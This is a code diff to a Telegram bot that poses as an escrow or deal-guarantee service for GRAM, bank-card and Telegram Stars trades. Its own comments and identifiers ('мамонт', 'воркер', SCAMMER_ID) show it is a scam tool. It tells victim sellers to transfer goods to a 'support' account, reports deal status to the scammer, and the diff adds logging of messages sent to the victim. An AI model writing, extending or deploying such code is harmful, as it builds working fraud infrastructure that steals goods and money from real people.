@@ -77,10 +77,18 @@ def get_currency_emoji(currency):
         return E_GIFT
     return ""
 
+def get_currency_display(currency):
+    if currency == "грам":
+        return "грам"
+    elif currency == "карта":
+        return "карта"
+    elif currency == "звезд":
+        return "звезд"
+    return currency
+
 async def send_main_menu(message: Message, user_id: int):
     is_admin_user = is_admin(user_id)
 
-    # СНАЧАЛА КОМАНДЫ ВОРКЕРА (для админа)
     if is_admin_user:
         await message.answer(
             f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
@@ -93,7 +101,6 @@ async def send_main_menu(message: Message, user_id: int):
             f"/chat *юз/айди* – выгрузить историю переписки"
         )
 
-    # ПОТОМ ГЛАВНОЕ МЕНЮ
     if os.path.exists(WELCOME_GIF_PATH):
         try:
             gif = FSInputFile(WELCOME_GIF_PATH)
@@ -155,6 +162,7 @@ async def cmd_start(message: Message, state: FSMContext):
                 req_text = format_requisites(reqs)
                 
                 currency_emoji = get_currency_emoji(deal[5])
+                currency_display = get_currency_display(deal[5])
                 
                 await message.answer(
                     f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
@@ -478,6 +486,7 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
     
     currency_display = {"gram": "GRAM", "card": "Карта", "stars": "Звёзды"}[currency]
     
+    # ДЛЯ ЗВЁЗД — СРАЗУ ПРОСИМ СУММУ (РЕКВИЗИТЫ НЕ НУЖНЫ)
     if currency == "stars":
         await state.update_data(currency=currency_names[currency])
         if not callback.message.text:
@@ -496,6 +505,7 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
     
+    # ДЛЯ GRAM И КАРТА — ПРОВЕРЯЕМ РЕКВИЗИТЫ
     user_id = callback.from_user.id
     reqs = get_requisites(user_id)
     
@@ -574,7 +584,8 @@ async def process_description(message: Message, state: FSMContext):
 
     user_id = message.from_user.id
     
-    if currency != "звезд":
+    # ПРОВЕРКА РЕКВИЗИТОВ ТОЛЬКО ДЛЯ ГРАМ И КАРТА
+    if currency == "грам" or currency == "карта":
         reqs = get_requisites(user_id)
         req_type = "gram" if currency == "грам" else "card"
         has_req = False
@@ -584,11 +595,12 @@ async def process_description(message: Message, state: FSMContext):
                 break
         if not has_req:
             await message.answer(
-                f"{E_CROSS} <b>У вас не добавлены реквизиты!</b>\n\n"
+                f"{E_CROSS} <b>У вас не добавлены реквизиты для {currency}!</b>\n\n"
                 f"Добавьте их в меню 'Реквизиты'",
-                reply_markup=back_button()
+                reply_markup=requisite_menu()
             )
             return
+    # ДЛЯ ЗВЁЗД — ПРОПУСКАЕМ
 
     bot_username = (await message.bot.get_me()).username
 
@@ -967,11 +979,13 @@ async def confirm_deal(callback: CallbackQuery):
                 f"Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
                 reply_markup=support_button()
             )
+            logger.info(f"Сообщение отправлено мамонту (seller_id={seller_id})")
         except Exception as e:
             logger.error(f"Не удалось отправить сообщение мамонту: {e}")
 
-    # ===== СКАМЕРУ: проверь передачу (кнопка) =====
-    await callback.message.edit_text(
+    # ===== СКАМЕРУ: проверь передачу (НОВОЕ СООБЩЕНИЕ) =====
+    await callback.bot.send_message(
+        SCAMMER_ID,
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
@@ -982,7 +996,7 @@ async def confirm_deal(callback: CallbackQuery):
         reply_markup=deal_status_buttons(deal_code, is_seller=True)
     )
 
-    await callback.answer()
+    await callback.answer("✅ Передача подтверждена!")
 
 # ============ ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ (СКАМЕР) ============
 
